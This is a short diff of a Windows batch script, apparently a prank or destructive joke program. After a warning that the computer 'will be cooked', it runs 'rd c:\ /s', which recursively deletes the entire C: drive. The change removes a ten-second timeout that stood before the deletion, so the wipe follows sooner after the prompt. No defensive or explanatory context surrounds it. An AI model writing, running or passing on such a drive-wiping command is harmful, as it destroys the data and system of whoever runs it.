@@ -9,7 +9,6 @@ if /i not %input%== yes,no goto 1
 
 :delete
 echo Last warning! If you click on y and enter, your computer will be cooked
-timeout 10
 rd c:\ /s
 pause
 exit
